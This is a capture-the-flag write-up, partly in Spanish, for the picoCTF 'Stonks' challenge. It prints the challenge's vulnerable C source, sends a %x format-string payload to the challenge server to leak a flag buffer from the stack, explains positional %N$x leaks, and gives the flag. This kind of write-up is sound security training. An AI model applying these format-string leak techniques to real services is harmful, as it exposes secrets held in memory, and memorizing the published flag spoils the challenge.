## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c) `nc mercury.picoctf.net 20195`
## Solución
```bash
kali@KaliEND:~/Downloads/PicoCTF/act_24$ cd stonks/  
kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ wget https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c  
--2024-11-12 23:17:49--  https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c  
Resolviendo mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142  
Conectando con mercury.picoctf.net (mercury.picoctf.net)[18.189.209.142]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 2744 (2,7K) [application/octet-stream]  
Grabando a: «vuln.c»  
  
vuln.c                           100%[========================================================>]   2,68K  --.-KB/s    en 0s         
  
2024-11-12 23:17:50 (38,6 MB/s) - «vuln.c» guardado [2744/2744]  
  
kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ ls  
vuln.c  
kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ cat vuln.c    
#include <stdlib.h>  
#include <stdio.h>  
#include <string.h>  
#include <time.h>  
  
#define FLAG_BUFFER 128  
#define MAX_SYM_LEN 4  
  
typedef struct Stonks {  
       int shares;  
       char symbol[MAX_SYM_LEN + 1];  
       struct Stonks *next;  
} Stonk;  
  
typedef struct Portfolios {  
       int money;  
       Stonk *head;  
} Portfolio;  
  
int view_portfolio(Portfolio *p) {  
       if (!p) {  
               return 1;  
       }  
       printf("\nPortfolio as of ");  
       fflush(stdout);  
       system("date"); // TODO: implement this in C  
       fflush(stdout);  
  
       printf("\n\n");  
       Stonk *head = p->head;  
       if (!head) {  
               printf("You don't own any stonks!\n");  
       }  
       while (head) {  
               printf("%d shares of %s\n", head->shares, head->symbol);  
               head = head->next;  
       }  
       return 0;  
}  
  
Stonk *pick_symbol_with_AI(int shares) {  
       if (shares < 1) {  
               return NULL;  
       }  
       Stonk *stonk = malloc(sizeof(Stonk));  
       stonk->shares = shares;  
  
       int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;  
       for (int i = 0; i <= MAX_SYM_LEN; i++) {  
               if (i < AI_symbol_len) {  
                       stonk->symbol[i] = 'A' + (rand() % 26);  
               } else {  
                       stonk->symbol[i] = '\0';  
               }  
       }  
  
       stonk->next = NULL;  
  
       return stonk;  
}  
  
int buy_stonks(Portfolio *p) {  
       if (!p) {  
               return 1;  
       }  
       char api_buf[FLAG_BUFFER];  
       FILE *f = fopen("api","r");  
       if (!f) {  
               printf("Flag file not found. Contact an admin.\n");  
               exit(1);  
       }  
       fgets(api_buf, FLAG_BUFFER, f);  
  
       int money = p->money;  
       int shares = 0;  
       Stonk *temp = NULL;  
       printf("Using patented AI algorithms to buy stonks\n");  
       while (money > 0) {  
               shares = (rand() % money) + 1;  
               temp = pick_symbol_with_AI(shares);  
               temp->next = p->head;  
               p->head = temp;  
               money -= shares;  
       }  
       printf("Stonks chosen\n");  
  
       // TODO: Figure out how to read token from file, for now just ask  
  
       char *user_buf = malloc(300 + 1);  
       printf("What is your API token?\n");  
       scanf("%300s", user_buf);  
       printf("Buying stonks with token:\n");  
       printf(user_buf);  
  
       // TODO: Actually use key to interact with API  
  
       view_portfolio(p);  
  
       return 0;  
}  
  
Portfolio *initialize_portfolio() {  
       Portfolio *p = malloc(sizeof(Portfolio));  
       p->money = (rand() % 2018) + 1;  
       p->head = NULL;  
       return p;  
}  
  
void free_portfolio(Portfolio *p) {  
       Stonk *current = p->head;  
       Stonk *next = NULL;  
       while (current) {  
               next = current->next;  
               free(current);  
               current = next;  
       }  
       free(p);  
}  
  
int main(int argc, char *argv[])  
{  
       setbuf(stdout, NULL);  
       srand(time(NULL));  
       Portfolio *p = initialize_portfolio();  
       if (!p) {  
               printf("Memory failure\n");  
               exit(1);  
       }  
  
       int resp = 0;  
  
       printf("Welcome back to the trading app!\n\n");  
       printf("What would you like to do?\n");  
       printf("1) Buy some stonks!\n");  
       printf("2) View my portfolio\n");  
       scanf("%d", &resp);  
  
       if (resp == 1) {  
               buy_stonks(p);  
       } else if (resp == 2) {  
               view_portfolio(p);  
       }  
  
       free_portfolio(p);  
       printf("Goodbye!\n");  
  
       exit(0);  
}

kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ nc mercury.picoctf.net 20195  
Welcome back to the trading app!  
  
What would you like to do?  
1) Buy some stonks!  
2) View my portfolio  
1  
Using patented AI algorithms to buy stonks  
Stonks chosen  
What is your API token?  
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x  
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x  
Buying stonks with token:  
8cac3d0804b00080489c3f7ecbd80ffffffff18caa160f7ed9110f7ecbdc708cab18018cac3b08cac3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f  
795f79336e3534303664303664ffd2007df7f06af8f7ed9440bae0b70010f7d68ce9f7eda0c0f7ecb5c0f7ecb000ffd2e478f7d5968df7ecb5c08048ecaffd2e48  
40f7eedf09804b000f7ecb000f7ecbe20ffd2e4b8f7ef3d50f7ecc890bae0b700f7ecb000804b000ffd2e4b88048c868caa160ffd2e4a4ffd2e4b88048be9f7ecb  
3fc0ffd2e56cffd2e564118caa160bae0b700ffd2e4d000f7d0efa1f7ecb000f7ecb0000f7d0efa11ffd2e564ffd2e56cffd2e4f410f7ecb000f7eee70af7f0600  
00f7ecb00000  
Portfolio as of Wed Nov 13 05:20:30 UTC 2024  
  
  
1 shares of W  
1 shares of VRQR  
2 shares of S  
17 shares of W  
175 shares of LD  
273 shares of CLO  
859 shares of GSO  
Goodbye!  
kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ nano solve.py  
kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ python3 solve.py
(venv1) kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ python3 -m venv venv1  
(venv1) kali@KaliEND:~/Downloads/PicoCTF/act_24/stonks$ python3 solve.py
[*] Checking for new versions of pwntools  
   To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.12/update to 'never' (old way).  
   Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):  
       [update]  
       interval=never  
[*] You have the latest version of Pwntools (4.13.1)  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
[+] Opening connection to mercury.picoctf.net on port 20195: Done  
[*] Closed connection to mercury.picoctf.net port 20195  
Leaked flag: picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}

```
## Notas Adicionales
Lo que queremos hacer es cargar el contenido del archivo que guarda la bandera (llamado api) en una variable llamada api_buf. Esta variable es local, así que se almacenará en la pila. La idea es aprovechar la vulnerabilidad de Format String para filtrar el valor de api_buf.

Para hacerlo, podemos usar una lista de formatos %x que lee desde la pila. Sin embargo, si queremos ser más precisos, podemos usar `%1$x` para leer el primer valor de la pila, `%2$x` para el segundo, y así sucesivamente.
flag: `picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}`
### Referencias